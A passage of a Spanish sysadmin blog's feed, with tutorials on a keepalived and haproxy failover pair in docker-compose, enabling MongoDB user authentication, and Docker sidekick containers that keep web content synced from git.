&lt;span class="s2"&gt;      script \&amp;quot;/bin/busybox killall -0 &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;\&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;      interval &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CHECK_INTERVAL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      weight &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CHECK_WEIGHT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;

&lt;span class="s2"&gt;vrrp_instance VI_1 {&lt;/span&gt;
&lt;span class="s2"&gt;      interface &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;INTERFACE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      state &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;STATE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      virtual_router_id &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ROUTER&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      priority &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PRIORITY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      virtual_ipaddress {&lt;/span&gt;
&lt;span class="s2"&gt;           &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIP&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      }&lt;/span&gt;
&lt;span class="s2"&gt;      track_script {&lt;/span&gt;
&lt;span class="s2"&gt;           chk_&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      }&lt;/span&gt;
&lt;span class="s2"&gt;}&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &amp;gt; /etc/keepalived/keepalived.conf

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/keepalived -l -n
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construiremos la imagen bajo el &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;sirrtea/keepalived:alpine&lt;/code&gt; para su uso futuro.&lt;/p&gt;
&lt;p&gt;La imagen de &lt;strong&gt;haproxy&lt;/strong&gt; no es especial, y podemos utilizar cualquiera que ya tengamos, por ejemplo, &lt;a href="https://hub.docker.com/r/sirrtea/haproxy/"&gt;esta&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Desplegando las imágenes&lt;/h3&gt;
&lt;p&gt;Por comodidad, vamos a utilizar &lt;strong&gt;docker-compose&lt;/strong&gt; que levante el conjunto de &lt;strong&gt;kepalived&lt;/strong&gt; y &lt;strong&gt;haproxy&lt;/strong&gt;, uno en cada &lt;em&gt;host&lt;/em&gt;. Es importante recalcar que la directiva &lt;code&gt;pid&lt;/code&gt; solo funciona con la versión 2.1 o superior de &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Vamos a levantar el &lt;strong&gt;nginx&lt;/strong&gt; en el &lt;em&gt;namespace&lt;/em&gt; de &lt;strong&gt;keepalived&lt;/strong&gt;. esto se hace así porque &lt;strong&gt;keepalived&lt;/strong&gt; no se va a caer y puede comprobar si el &lt;strong&gt;haproxy&lt;/strong&gt; está corriendo o no. De hacerlo al revés, la caída del &lt;strong&gt;haproxy&lt;/strong&gt; (que sería el PID 1), causaría el fin del contenedor, y la parada de todos los procesos del &lt;em&gt;namespace&lt;/em&gt;, incluyendo &lt;strong&gt;keepalived&lt;/strong&gt;. Esto que haría que el &lt;em&gt;check&lt;/em&gt; del servicio &lt;strong&gt;haproxy&lt;/strong&gt; no sirviera de nada.&lt;/p&gt;
&lt;h4&gt;El host master&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ cat master/docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2.1&amp;#39;&lt;/span&gt;
services:
  keepalived:
    image: sirrtea/keepalived:alpine
    container_name: keepalived
    hostname: keepalived
    environment:
      SERVICE: haproxy
      CHECK_INTERVAL: &lt;span class="m"&gt;2&lt;/span&gt;
      CHECK_WEIGHT: &lt;span class="m"&gt;2&lt;/span&gt;
      INTERFACE: enp0s3
      STATE: MASTER
      VIRTUAL_ROUTER: &lt;span class="m"&gt;51&lt;/span&gt;
      PRIORITY: &lt;span class="m"&gt;11&lt;/span&gt;
      VIP: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    network_mode: host
    cap_add:
      - NET_ADMIN
  haproxy:
    image: sirrtea/haproxy:alpine
    container_name: haproxy
    hostname: haproxy
    pid: &lt;span class="s2"&gt;&amp;quot;service:keepalived&amp;quot;&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:8080&amp;quot;&lt;/span&gt;
    depends_on:
      - keepalived
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este &lt;em&gt;docker-compose.yml&lt;/em&gt; podemos ver varias cosas interesantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;En el servicio &lt;em&gt;keepalived&lt;/em&gt;:&lt;ul&gt;
&lt;li&gt;Unas variables de entorno que solo sirven para generar la configuración de &lt;strong&gt;keepalived&lt;/strong&gt;, tal como se hace en el &lt;em&gt;script&lt;/em&gt; &lt;code&gt;start.sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;La directiva &lt;code&gt;network_mode: host&lt;/code&gt; que sirve para que el contenedor use la red del &lt;em&gt;host&lt;/em&gt;, pudiendo manejar sus direcciones IP&lt;/li&gt;
&lt;li&gt;La directiva &lt;code&gt;cap_add: NET_ADMIN&lt;/code&gt;, que es la &lt;em&gt;capability&lt;/em&gt; mínima y necesaria para que el contenedor pueda modificar las configuraciones de red&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;En el servicio &lt;em&gt;haproxy&lt;/em&gt;:&lt;ul&gt;
&lt;li&gt;La directiva &lt;code&gt;pid&lt;/code&gt; que nos permite estar en el &lt;em&gt;namespace&lt;/em&gt; de &lt;em&gt;keepalived&lt;/em&gt;, para que sus procesos se vean entre sí&lt;/li&gt;
&lt;li&gt;La directiva &lt;code&gt;depends_on&lt;/code&gt;, de forma que se tenga que levantar primero &lt;em&gt;keepalived&lt;/em&gt;; de lo contrario, no podríamos estar en su &lt;em&gt;namespace&lt;/em&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;El host slave&lt;/h4&gt;
&lt;p&gt;El truco es el mismo, pero teniendo en cuenta que la configuración de &lt;strong&gt;keepalived&lt;/strong&gt; es un poco distinta. Eso lo conseguimos cambiando las variables de entorno que la genera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ cat slave/docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2.1&amp;#39;&lt;/span&gt;
services:
  keepalived:
    image: sirrtea/keepalived:alpine
    container_name: keepalived
    hostname: keepalived
    environment:
      SERVICE: haproxy
      CHECK_INTERVAL: &lt;span class="m"&gt;2&lt;/span&gt;
      CHECK_WEIGHT: &lt;span class="m"&gt;2&lt;/span&gt;
      INTERFACE: enp0s3
      STATE: BACKUP
      VIRTUAL_ROUTER: &lt;span class="m"&gt;51&lt;/span&gt;
      PRIORITY: &lt;span class="m"&gt;10&lt;/span&gt;
      VIP: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    network_mode: host
    cap_add:
      - NET_ADMIN
  haproxy:
    image: sirrtea/haproxy:alpine
    container_name: haproxy
    hostname: haproxy
    pid: &lt;span class="s2"&gt;&amp;quot;service:keepalived&amp;quot;&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:8080&amp;quot;&lt;/span&gt;
    depends_on:
      - keepalived
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los cambios son las variables de entorno &lt;code&gt;STATE&lt;/code&gt; y &lt;code&gt;PRIORITY&lt;/code&gt; en el servicio &lt;em&gt;keepalived&lt;/em&gt;; el resto se mantiene igual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ diff master/docker-compose.yml slave/docker-compose.yml
12c12
&amp;lt;       STATE: MASTER
---
&amp;gt;       STATE: BACKUP
14c14
&amp;lt;       PRIORITY: &lt;span class="m"&gt;11&lt;/span&gt;
---
&amp;gt;       PRIORITY: &lt;span class="m"&gt;10&lt;/span&gt;
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría desplegar ambos &lt;em&gt;docker-compose.yml&lt;/em&gt; cada uno en un &lt;em&gt;host&lt;/em&gt; distinto y ver que funciona como debe.&lt;/p&gt;</content><category term="docker"></category><category term="namespaces"></category><category term="keepalived"></category><category term="haproxy"></category></entry><entry><title>Usando autenticación en MongoDB</title><link href="http://www.linuxsysadmin.ml/2018/03/usando-autenticacion-en-mongodb.html" rel="alternate"></link><published>2018-03-26T10:00:00+02:00</published><updated>2018-03-26T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-03-26:/2018/03/usando-autenticacion-en-mongodb.html</id><summary type="html">&lt;p&gt;Usar autenticación en las bases de datos de nuestros entornos, por muy privados que sean, suele ser una buena idea. Nos sirve para separar los accesos a un servicio compartido y evitar sobreescrituras cuando accidentalmente dos servicios usan la misma base de datos por un error de algún usuario despistado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Usar autenticación en las bases de datos de nuestros entornos, por muy privados que sean, suele ser una buena idea. Nos sirve para separar los accesos a un servicio compartido y evitar sobreescrituras cuando accidentalmente dos servicios usan la misma base de datos por un error de algún usuario despistado.&lt;/p&gt;
&lt;p&gt;No es la primera vez que un &lt;em&gt;cluster&lt;/em&gt; compartido entre varios proyectos acaba con la destrucción de datos accidental; el uso habitual de &lt;em&gt;copy-paste&lt;/em&gt; en nuestros &lt;em&gt;docker-compose.yml&lt;/em&gt; o en otros ficheros de configuración, nos plantea un posible riesgo cuando alguien se olvida de cambiar el nombre de la base de datos.&lt;/p&gt;
&lt;p&gt;Estos casos son fácilmente evitables si las plantillas contienen unos parámetros de &lt;strong&gt;usuario&lt;/strong&gt; y &lt;strong&gt;password&lt;/strong&gt; no usables, y solamente la correcta combinación de ambos con la base de datos dan acceso a los datos. De esta forma, las diferentes bases de datos serian accesibles por diferentes usuarios y haría falta conocer todos los datos de acceso para usar la base de datos de otra aplicación.&lt;/p&gt;
&lt;h2&gt;Preparación&lt;/h2&gt;
&lt;p&gt;En &lt;strong&gt;MongoDB&lt;/strong&gt;, los usuarios pertenecen a una base de datos, y no son globales. Esto significa que tenemos que crearlos en una base de datos concreta y que cualquiera que quiera autenticarse debe hacerlo contra la base de datos que contenga su usuario. La autorización en sí garantiza mediante la aplicación de diferentes &lt;em&gt;roles&lt;/em&gt;, a nivel de base de datos o a nivel global.&lt;/p&gt;
&lt;p&gt;Como decisión de diseño, vamos a poner todos los usuarios en la misma base de datos, que va a ser &lt;em&gt;admin&lt;/em&gt;. Para ello necesitamos abrir un cliente a la base de datos, que por simplicidad va a ser el &lt;em&gt;shell&lt;/em&gt; básico, binario &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Crear un usuario de administración&lt;/h3&gt;
&lt;p&gt;Se trata simplemente de crear un usuario, con el &lt;em&gt;role&lt;/em&gt; suficiente para hacer las tareas necesarias. Como se trata de un usuario muy exclusivo, le voy a dar el &lt;em&gt;role root&lt;/em&gt;, que básicamente me lo permite hacer todo. Podéis adaptar vuestro comando eligiendo el &lt;em&gt;role&lt;/em&gt; que más os convenga, según &lt;a href="https://docs.mongodb.com/manual/reference/built-in-roles/#built-in-roles"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; use admin
switched to db admin
&amp;gt; db.createUser(
...   {
...     user: &amp;quot;admin&amp;quot;,
...     pwd: &amp;quot;s3cr3t&amp;quot;,
...     roles: [ { role: &amp;quot;root&amp;quot;, db: &amp;quot;admin&amp;quot; } ]
...   }
... )
Successfully added user: {
        &amp;quot;user&amp;quot; : &amp;quot;admin&amp;quot;,
        &amp;quot;roles&amp;quot; : [
                {
                        &amp;quot;role&amp;quot; : &amp;quot;root&amp;quot;,
                        &amp;quot;db&amp;quot; : &amp;quot;admin&amp;quot;
                }
        ]
}
&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Aunque el &lt;em&gt;role root&lt;/em&gt; permite actuar en todas las bases de datos, hay que indicarle una cualquiera para que la especificación JSON sea correcta.&lt;/p&gt;
&lt;h3&gt;Activar la autenticación&lt;/h3&gt;
&lt;p&gt;Lo único necesario para que &lt;strong&gt;MongoDB&lt;/strong&gt; requiera autenticación es un parámetro de configuración, sea:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--auth&lt;/code&gt; cuando levantamos el servidor&lt;/li&gt;
&lt;li&gt;El parámetro de configuración &lt;code&gt;security.authorization: enabled&lt;/code&gt; en el fichero de configuración&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hay que reiniciar el proceso para que use este nuevo parámetro, tanto para activarlo como para desactivarlo. A partir de este punto, todas las operaciones a la base de datos, van a necesitar que la sesión esté autenticada, y que dicho usuario tenga el &lt;em&gt;role&lt;/em&gt; necesario para hacer lo que pide.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Hay una &lt;a href="https://docs.mongodb.com/manual/core/security-users/#localhost-exception"&gt;excepción de localhost&lt;/a&gt;; si no hay ningún usuario en la base de datos y nos conectamos a ella desde &lt;em&gt;localhost&lt;/em&gt;, no va a ser necesaria ninguna autenticación. Usando esta excepción podemos levantar el servicio siempre con &lt;code&gt;--auth&lt;/code&gt; o &lt;code&gt;security.authorization&lt;/code&gt; y crear el superusuario &lt;em&gt;a posteriori&lt;/em&gt;, sin reiniciar nada.&lt;/p&gt;
&lt;h2&gt;Uso&lt;/h2&gt;
&lt;p&gt;Ha llegado el momento de poner una aplicación nueva que use nuestro servicio de &lt;strong&gt;MongoDB&lt;/strong&gt;. Esa aplicación necesita su propio espacio de datos, lo que significa que necesita:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una base de datos propia, que &lt;strong&gt;MongoDB&lt;/strong&gt; creará automáticamente cuando haga falta&lt;/li&gt;
&lt;li&gt;Un usuario con acceso a esa base de datos (y a ninguna más)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Añadir un usuario nuevo&lt;/h3&gt;
&lt;p&gt;Otra vez nos limitamos a crear un usuario, pero esta vez le vamos a dar el &lt;em&gt;role readWrite&lt;/em&gt; sobre su base de datos. Abrimos una sesión en el &lt;em&gt;mongo shell&lt;/em&gt;, autenticándonos en la base de datos &lt;em&gt;admin&lt;/em&gt; con un usuario con capacidad de crear usuarios, por ejemplo el que creamos antes: &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; use admin
switched to db admin
&amp;gt; db.auth(&amp;quot;admin&amp;quot;, &amp;quot;s3cr3t&amp;quot;)
1
&amp;gt; db.createUser(
...   {
...     user: &amp;quot;myapp&amp;quot;,
...     pwd: &amp;quot;myapp1234&amp;quot;,
...     roles: [ { role: &amp;quot;readWrite&amp;quot;, db: &amp;quot;myapp&amp;quot; } ]
...   }
... )
Successfully added user: {
        &amp;quot;user&amp;quot; : &amp;quot;myapp&amp;quot;,
        &amp;quot;roles&amp;quot; : [
                {
                        &amp;quot;role&amp;quot; : &amp;quot;readWrite&amp;quot;,
                        &amp;quot;db&amp;quot; : &amp;quot;myapp&amp;quot;
                }
        ]
}
&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto es suficiente, puesto que la base de datos se crea automáticamente cuando tenga alguna colección. En este caso, el usuario y la base de datos coinciden; esto es otra decisión de diseño.&lt;/p&gt;
&lt;h3&gt;Configuración de la aplicación&lt;/h3&gt;
&lt;p&gt;Cada cliente de &lt;strong&gt;MongoDB&lt;/strong&gt; tiene sus propias formas para autenticarse; podemos ver el uso de la función &lt;code&gt;db.auth()&lt;/code&gt; por parte del &lt;em&gt;mongo shell&lt;/em&gt;, en el ejemplo anterior. La documentación es extensa en este punto.&lt;/p&gt;
&lt;p&gt;Lo importante es que la autenticación se hace con el usuario y contraseña proporcionados, &lt;strong&gt;en la base de datos &lt;em&gt;admin&lt;/em&gt;&lt;/strong&gt;. El uso regular de la base de datos se hace &lt;strong&gt;en la base de datos de la aplicación&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Todas las librerías tienen una forma común muy cómoda para indicar la base de datos destino: la &lt;a href="https://docs.mongodb.com/manual/reference/connection-string/"&gt;URL de mongodb&lt;/a&gt;. En ellas se nos permite especificar la base de datos de uso y la de autenticación (parámetro &lt;code&gt;authSource&lt;/code&gt;), así como el usuario y la contraseña.&lt;/p&gt;
&lt;p&gt;Para el ejemplo anterior, la URL quedaría así, suponiendo que el servicio está en el &lt;em&gt;host&lt;/em&gt; &lt;strong&gt;mongo&lt;/strong&gt;: &lt;code&gt;mongodb://myapp:myapp1234@mongo:27017/myapp?authSource=admin&lt;/code&gt;&lt;/p&gt;</content><category term="mongodb"></category><category term="autenticación"></category></entry><entry><title>Los sidekick containers en Docker</title><link href="http://www.linuxsysadmin.ml/2018/03/los-sidekick-containers-en-docker.html" rel="alternate"></link><published>2018-03-19T10:00:00+01:00</published><updated>2018-03-19T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-03-19:/2018/03/los-sidekick-containers-en-docker.html</id><summary type="html">&lt;p&gt;Algunas veces nos hemos encontrado que necesitamos ejecutar dos procesos o más para un servicio, aunque uno de ellos es el servicio principal y el otro se limita a ayudar al otro de alguna manera. Mejor que ponerlos en el mismo contenedor, podemos limitarnos a usar el patrón &lt;em&gt;sidekick containers …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces nos hemos encontrado que necesitamos ejecutar dos procesos o más para un servicio, aunque uno de ellos es el servicio principal y el otro se limita a ayudar al otro de alguna manera. Mejor que ponerlos en el mismo contenedor, podemos limitarnos a usar el patrón &lt;em&gt;sidekick containers&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En vez de utilizar un gestor de procesos para levantar ambas funciones, lo que añade complejidad a la imagen global, podemos utilizar dos contenedores que se comuniquen mediante volúmenes.&lt;/p&gt;
&lt;p&gt;En estos casos, debemos ver ambos contenedores como un &lt;em&gt;pack&lt;/em&gt; indivisible, que deben ser desplegados en el mismo servidor, y se escalan a la vez. Para asegurar ese despliegue condicionado, cada orquestador tiene su método, como por ejemplo, los &lt;strong&gt;pods&lt;/strong&gt; de &lt;strong&gt;kubernetes&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Llamaremos al contenedor inicial como &lt;em&gt;principal&lt;/em&gt; y el resto, de apoyo, son los &lt;em&gt;sidekick&lt;/em&gt; containers. Las funciones de estos últimos son muy variopintas; por nombrar algunas, podemos decir:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Envío de logs a un servidor centralizado&lt;/li&gt;
&lt;li&gt;Hacer backups de la base de datos del contenedor principal&lt;/li&gt;
&lt;li&gt;Actualizar contenido para otro servicio de forma automática&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Con un poco de imaginación se os ocurrirán muchas más.&lt;/p&gt;
&lt;h2&gt;Un ejemplo: un servidor web con contenido en git&lt;/h2&gt;
&lt;p&gt;Tenemos un servidor web que sirve un contenido concreto. Tal como escalamos, necesitamos más copias del mismo y hay que sincronizarlo. Podríamos poner el contenido en la imagen, pero al cambiar este, habría que hacer un redespliegue masivo&lt;/p&gt;
&lt;p&gt;Entonces podemos utilizar el patrón &lt;em&gt;sidekick&lt;/em&gt; containers para hacer lo siguiente:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Un contenedor principal con el servidor web que elijamos, sirviendo desde un volumen.&lt;/li&gt;
&lt;li&gt;Un contenedor &lt;em&gt;sidekick&lt;/em&gt; que exporta el volumen del contenedor principal y lo va actualizando.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;De esta forma, no importa cuantas replicas tengamos de este par, ni tampoco si cambia el contenido de la fuente; cada &lt;em&gt;sidekick&lt;/em&gt; se dedicará mantener actualizado el contenido de su contenedor principal, por supesto sin intervención manual.&lt;/p&gt;
&lt;p&gt;Hay muchas formas de sincronizar el contenido desde una fuente, pero por decisión de diseño, vamos a suponer que tenemos la fuente en un repositori &lt;strong&gt;git&lt;/strong&gt;, que gestiona las copias incrementales y nos aligera la transferencia.&lt;/p&gt;
&lt;h3&gt;El servidor web&lt;/h3&gt;
&lt;p&gt;Se trata de un servidor web normal y corriente, sirviendo un &lt;em&gt;document root&lt;/em&gt; cualquiera. Para agilizar, voy a utilizar una imagen prefabricada de &lt;strong&gt;nginx&lt;/strong&gt;, con una configuración para servir &lt;em&gt;/srv/www/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/sidekick$ cat web/Dockerfile
FROM sirrtea/nginx:alpine
COPY web.conf /etc/nginx/conf.d/
gerard@atlantis:~/projects/sidekick$ cat web/web.conf
server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/projects/sidekick$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a construir la imagen con los comandos habituales, y le vamos a poner el &lt;em&gt;tag&lt;/em&gt; &lt;strong&gt;web&lt;/strong&gt;, para usar en el resto del artículo.&lt;/p&gt;
&lt;h3&gt;El clonador de git&lt;/h3&gt;
&lt;p&gt;Básicamente se trata de un contenedor que ejecute periodicamente un &lt;code&gt;git pull&lt;/code&gt;, o un &lt;code&gt;git clone&lt;/code&gt; si la carpeta estaba vacía. Para poder reutilizar la imagen, voy a parametrizar el repositorio a usar, la carpeta en donde clonarlo y el tiempo de espera entre actualizaciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/sidekick$ cat updater/Dockerfile
FROM alpine:3.7
RUN apk add --no-cache git
COPY run.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/run.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/projects/sidekick$ cat updater/run.sh
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;DESTINATION&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -e .git &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        git pull
    &lt;span class="k"&gt;else&lt;/span&gt;
        git clone &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPOSITORY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; .
    &lt;span class="k"&gt;fi&lt;/span&gt;
    sleep &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;DELAY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/projects/sidekick$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construiremos la imagen como siempre y vamos a ponerle el &lt;em&gt;tag&lt;/em&gt; &lt;strong&gt;updater&lt;/strong&gt;, para referencia del resto del artículo.&lt;/p&gt;
&lt;h3&gt;Juntando los contenedores&lt;/h3&gt;
&lt;p&gt;La idea es que el contenedor tipo &lt;strong&gt;web&lt;/strong&gt; sirva la carpeta &lt;em&gt;/srv/www/&lt;/em&gt;, que es un volumen. El contenedor tipo &lt;strong&gt;updater&lt;/strong&gt; va a exportar el volumen, y va a actualizar la carpeta del mismo, para que las peticiones al contenedor &lt;strong&gt;web&lt;/strong&gt; se encuentren con el contenido actalizado periodicamente.&lt;/p&gt;
&lt;p&gt;Vamos a utilizar &lt;strong&gt;docker-compose&lt;/strong&gt; para agilizar el levantamiento de ambos contenedores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/sidekick$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  web:
    image: web
    volumes:
      - /srv/www
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8080:80&amp;quot;&lt;/span&gt;
  web_sidekick:
    image: updater
    environment:
      DESTINATION: /srv/www
      REPOSITORY: https://github.com/Sirtea/sidekick-example.git
      DELAY: &lt;span class="m"&gt;60&lt;/span&gt;
    volumes_from:
      - web
gerard@atlantis:~/projects/sidekick$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso configuramos el contenedor &lt;strong&gt;web_sidekick&lt;/strong&gt; para clonar el repositorio &lt;code&gt;sidekick-example.git&lt;/code&gt;, en la carpeta &lt;code&gt;/srv/www&lt;/code&gt; y actualizarlo cada minuto.&lt;/p&gt;
&lt;p&gt;El truco reside en los volúmenes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;web&lt;/strong&gt; sirve la carpeta &lt;code&gt;/srv/www&lt;/code&gt;, que es un volumen&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;web_sidekick&lt;/strong&gt; hace dos cosas:&lt;ul&gt;
&lt;li&gt;Exporta los volúmenes de &lt;strong&gt;web&lt;/strong&gt;, de forma que la carpeta &lt;code&gt;/srv/www&lt;/code&gt; es la misma que sirve &lt;strong&gt;web&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Actualiza el contenido de la carpeta &lt;code&gt;/srv/www&lt;/code&gt; con lo que tengamos en el repositorio de &lt;strong&gt;git&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Y de esta forma, el contenedor &lt;strong&gt;web&lt;/strong&gt; sirve un contenido que va a ir cambiando tal como el desarrollador haga los correspondientes &lt;em&gt;commits&lt;/em&gt; en el repositorio.&lt;/p&gt;
&lt;h2&gt;Escalando el servicio&lt;/h2&gt;
&lt;p&gt;Si queremos poner más servidores web, la ecuación es simple: un contenedor &lt;em&gt;sidekick&lt;/em&gt; por cada contenedor principal.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cada servidor web tiene un volumen&lt;/li&gt;
&lt;li&gt;Hace falta un contenedor &lt;em&gt;sidekick&lt;/em&gt; para actualizar un volumen&lt;/li&gt;
&lt;/ul&gt;
